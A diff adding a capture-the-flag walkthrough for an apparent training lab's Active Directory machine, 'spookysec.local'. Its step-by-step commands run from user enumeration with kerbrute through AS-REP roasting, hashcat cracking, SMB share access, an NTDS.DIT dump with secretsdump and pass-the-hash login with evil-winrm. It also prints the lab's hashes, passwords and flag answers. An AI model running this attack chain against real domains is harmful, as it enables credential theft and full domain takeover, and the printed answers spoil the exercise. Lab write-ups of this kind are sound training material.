@@ -1,0 +1,90 @@
+
+#Enumeration 
+
+nmap scan: nmap -sV -sC -oN nmap.out 10.10.94.187
+
+What tool will allow us to enumerate port 139/445? : enum4linux
+
+What is the NetBIOS-Domain Name of the machine? : Look at the nmap scan
+
+What invalid TLD do people commonly use for their Active Directory Domain? .local (Spoiler: The full AD domain is spookysec.local)
+
+
+#Enumeration Users via kerbrute
+
+What command within Kerbrute will allow us to enumerate valid usernames? userenum (./kerbrute -h may help you)
+
+To discover user accounts we can now run: kerbrute userenum -dc <target ip> -d spookysec.local userlist.txt
+
+What notable accounts is discovered? svc-admin and backup
+
+#Explotation - Abusing kerberos
+
+1. run the script, specify the domain name, user and the IP for the machine
+
+Backup user (DID NOT WORK): python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py pookysec.local/backup -no-pass -dc-ip 10.10.94.187 
+
+svc-admin user (WORKED): python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py spookysec.local/svc-admin -no-pass -dc-ip 10.10.94.187
+
+*] Getting TGT for svc-admin
+$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:c23660da0f9f151733568ec08281ea55$8887f80495ad4acf677e60ce1b260215846b57f1ed2414122680e30b39631fd24be3c10f0fd69c46acc1bcc920f418f9c402164a300e148f8146a538fb40cb2b8a4f91704abec9e6f50e000fa4a708f1463a74a5b6b90dc3b00a80cb98c06ed50a9ffe7fc06d5cf94cb48b11c1eac7ade2529573d822ea14dfd700a33db661fbdfdb94b472e6742049c43f247eb789f5a2fe86bf0fe8c82148be3366a0080b8625ba4c6bfe8364435cb0c746f6128d17dd53a8893447ff90e43876722f33277ddd3c03c46ef8b8dd6235ce974ed449365e74419101b106670fb89668678007f3bfedcbeb29a8244913eb25ab8274fbc3266b
+
+HASH TYPE: Kerberos 5, etype 23, AS-REP
+
+HASH MODE: 18200
+
+2. To crack hash: hashcat -m 18200 hash.txt passwordlist.txt
+
+Password: management2005
+
+#Enumeration- Back to the basics (Enumeration With Credentials) 
+
+What utility can we use to map remote SMB shares? smbclient 
+
+Which option will list shares? -L
+
+RUN : smbclient -L 10.10.94.187 -U svc-admin
+
+How many remote shares is the server listing? 6
+
+
+There is one particular share that we have access to that contains a text file. Which share is it?
+
+1. RUN: smbclient \\\\10.10.94.187\\backup -U svc-admin
+2. get file: get backup_credentials.txt
+3. cat file
+
+User: backup
+Password: backup2517860
+
+#Domain Privilege Escalation - Elevating Privileges within the domain
+
+What method allowed us to dump NTDS.DIT ?
+
+1. RUN: python3 /opt/impacket/examples/secretsdump.py -just-dc backup@10.10.94.187
+
+2. Answer: DRSUAPI
+
+
+What is the Administrators NTLM hash? 0e0363213e37b94221497260b0bcb4fc:::
+
+What method of attack could allow us to authenticate as the user without the password? pass the hash
+
+Using a tool called Evil-WinRM what option will allow us to use a hash? -H
+
+RUN: evil-winrm -i 10.10.94.187 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
+
+#GET THE FLAGS
+
+1. SVC-ADMIN
+	a. go the the svc-admin desktop: cd C:\Users\svc-admin\Desktop
+	b. run ls
+	c. cat user.txt.txt
+2. BACKUP
+	a. cd C:\Users\backup\Desktop
+	b. ls
+	c. cat 
+3. ADMINISTRATOR
+	a. cd C:\Users\Administrator\Desktop
+	b. ls
+	c. cat root.txt
